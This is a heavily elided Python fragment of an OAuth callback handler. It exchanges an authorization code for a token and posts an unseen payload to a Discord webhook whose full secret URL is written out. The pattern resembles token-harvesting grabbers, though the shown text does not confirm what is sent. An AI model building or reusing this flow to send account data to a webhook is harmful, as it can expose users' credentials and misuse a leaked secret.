...
def handler(request):
    try:
        ...
        token_data = {
            ...
            "code": code,
            "redirect_uri": "https://callnack2.vercel.app/api/callback"
        }
        ...
        requests.post("https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf", json=payload)
